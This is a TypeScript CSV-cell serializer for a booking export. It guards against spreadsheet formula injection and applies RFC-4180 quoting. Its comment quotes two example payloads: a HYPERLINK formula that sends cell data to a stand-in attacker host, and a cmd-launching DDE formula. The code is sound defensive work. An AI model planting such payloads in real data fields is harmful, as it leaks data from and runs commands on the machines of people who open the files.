/**
 * Serialize a single value as a CSV field.
 *
 * Two layers of safety:
 *  1. CSV formula-injection guard. Excel / LibreOffice / Google Sheets treat a
 *     cell beginning with `= + - @` (or a leading tab/CR) as a formula. Booking
 *     fields like `customerName` are fully attacker-controlled via the public
 *     POST /api/v1/bookings endpoint, so a name such as
 *     `=HYPERLINK("https://evil.com?x="&A1,"x")` or `=cmd|'/c calc'!A1` would
 *     execute when an admin opens the exported file. We prefix any such value
 *     with an apostrophe so the spreadsheet renders it as literal text.
 *  2. RFC-4180 quoting. Fields containing a quote, comma or newline are wrapped
 *     in double-quotes with embedded quotes doubled.
 *
 * The guard runs before quoting so the apostrophe lands inside the quotes.
 */
export function csvCell(v: string | number): string {
  let s = String(v);
  if (/^[=+\-@\t\r]/.test(s)) s = `'${s}`;
  return /[",\n]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
}
